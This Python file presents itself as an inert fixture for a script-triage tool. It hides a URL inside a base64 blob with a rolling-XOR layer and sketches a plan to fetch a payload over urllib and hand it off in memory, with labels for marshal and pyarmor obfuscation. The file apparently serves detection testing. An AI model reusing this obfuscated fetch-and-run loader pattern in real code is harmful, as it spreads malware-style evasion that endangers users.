#!/usr/bin/env python3

# Huntress Script Triage -- inert static-analysis fixture (cpython3)

import base64

import io

import os



MATERIAL_33e74fbd = ("BDkLdwRwFWUWK0opWC1ENlMMfht2GW0IJEApWipLP1w0awZjDmETahZ3E3ICdhNhXClbN1syUA9iB2oFdw5yAXUUcxZJKkUwXioXJlopUD"

    "5KK1NuC3MQdQVxGHcZRiNbK1k8TzxVOlQoRyVDNkUmRzNaNVtmC2oYawNiDlE0WixJJUo6XwBwHH0TbwxtH20EYRMuXidGNFk2RBt0FnAF"

    "dhV0AGUBfQpjDWkGcQJdPlY3XjANeglqGHEBdSpeMW4eZxN7FHoGZQRpGXgRdhhHLkp3FHUYaAlgB2lEfE96QnRGdUFyFmofbQE8VCBUJF"

    "dtQm1VZlNrXW9caFs/EXQMbQBwHHlXPlAmRytCJglrWz4GNFJjBihYIV0oWz5ME3IVcB5qVx9qBHACZxRnN046Uj1TfER3QnpMfk15Si4=")

CODEC_33e74fbd = "base64_chunks|rolling_xor|72"



def load_33e74fbd():

    return base64.b64decode(MATERIAL_33e74fbd)



def decode_33e74fbd(stored_bytes):

    recovered_bytes = bytearray()

    prior_byte = 114

    for value in stored_bytes:

        recovered_bytes.append(value ^ prior_byte)

        prior_byte = value

    return bytes(recovered_bytes)



def recover_33e74fbd():

    harmless_value = "left" if 2 > 1 else "right"

    for _pass in range(1):

        recovered_bytes = decode_33e74fbd(load_33e74fbd())

    configuration_text = recovered_bytes.decode("ascii", "strict")

    return configuration_text



def inspect_33e74fbd():

    return recover_33e74fbd()



def surface_33e74fbd():

    try:

        raise LookupError("surface")

    except LookupError:

        return ("exception_expression", "marshal_envelope_plan", "pyarmor_obfuscated", "wscript_to_python")



def obfuscation_33e74fbd():

    marshal_plan = {"format": "code_object", "action": "inspect_only", "label": "marshal_envelope_plan"}

    return marshal_plan["label"]



def plan_33e74fbd():

    fields = dict(item.split("=", 1) for item in inspect_33e74fbd().split("|"))

    analysis_surface = surface_33e74fbd()

    obfuscation_surface = obfuscation_33e74fbd()

    operation_plan = ("urllib_memory", fields["url"], "memory-handoff")

    return operation_plan + (analysis_surface, obfuscation_surface)



if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":

    print(inspect_33e74fbd())

